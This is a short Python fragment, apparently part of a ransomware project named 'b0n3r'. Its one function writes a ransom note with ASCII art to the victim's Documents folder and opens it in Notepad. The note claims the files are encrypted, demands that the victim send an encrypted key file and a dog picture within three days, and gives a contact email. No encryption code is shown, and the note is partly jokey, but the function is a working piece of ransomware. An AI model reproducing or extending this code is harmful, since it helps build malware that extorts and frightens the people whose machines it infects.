import os

def dropnote():
    ransomnote_name = os.environ['USERPROFILE']+"\\Documents\\HOW-TO-DECRYPT-FILES.txt"
    with open(ransomnote_name, "w") as f:
        f.write('''
              00000                                                                                         
             0xxx::0                  000000000                       0000000                                   00000
             0xxxx0                 00:::  ::::00                    0:::::  00000000000                      00::xxx0
             0xxx:0               00:0000:::::  :00                   00   :::      ::::00                   0:xxxxxx0
             0xxxxx0             0  0x::x000::   ::0                    00000000000:::::::0              0000:xxxxxx0   
             0xxxxx0 00000000    0:::0xx:xxx0::::::000000  00000000                0:xx:::0        000000::xxxxxxx00
             0::xxxx0xxxxx:::0   0::x:000xxxx0::: :0::x::00xx:::xxx00               000000   00000::xxxxxxxxx0000
             0xxxxxxxxxxxxxxx:0  0:::x:0 000x0:::::0xxxxxxxxxxxxxxxxx00       000000000      0xxxxxxxx::xx0000 
             0xxxxxx0000xxxxxxx0 0:::xx0    00:::::0 00xxxxxxx00xxxxxx0     00  :::::::00   0xxxxxxxx00000
              0xx:x0    0xxxx::0 0::  :0     0:::::0   0x:xxx0  0xxxx:0      0:::000xx:::0  0xxxxx00
              0xxx:0     0xxx:x0 0::::::0   0::::::0   0xxxx0    0x:::0       0000  0::x::0 0xx::x0    
              0xxx:0     0xxxxx0 0::::::0   0::xx:x0  0xx:x0    0xxx:0               0::::0 0xxx:0            
              0xxxx0     0xxxxx0 0:::::::000:::  xx0  0xxxx0    0xxx:0   0000        0::x:0 0xxx:0            
             0xxxxxx0   0xxxxx:0  00:::::x :::xx:00   0:xxx0    0xxxx0  0:  :00     0::::x0 0xxxxx0            
            0xxxxxxx000xxxx:x0     00::::::x::00     0xx::0    0xx:x0  0::::::00000::::::0 0xxxxx0            
            0xxxxxxxxxxx::x00        000000000        0xxx:0    0xxxx0 000::x::::x:xx::00   00000             
             00000000000000                           0xxxx0    0xxx:0    0000000000000              
                                                       0000      0000                                              
    
    ======================================================================================================================
    You have been infected with b0n3r ransomware
    %%%%%%%%%  *********** 
                                                                                        
    
    Since this is a ransomware we demand a ransom. 
    
    To decrypt the files,
    send us the following:
    
    1. C:\\Users\\<yourstupidname>\\b0n3rk3yZ-DONOTDELETE\\privb0n3r.pem.b0n3r
    2. A picture of your dog
    
    You have 3 days to send us what we need. After that, forget it.
    send it to: jarenas@protonmail.com
        ''')
    os.system("start /max notepad.exe "+ransomnote_name)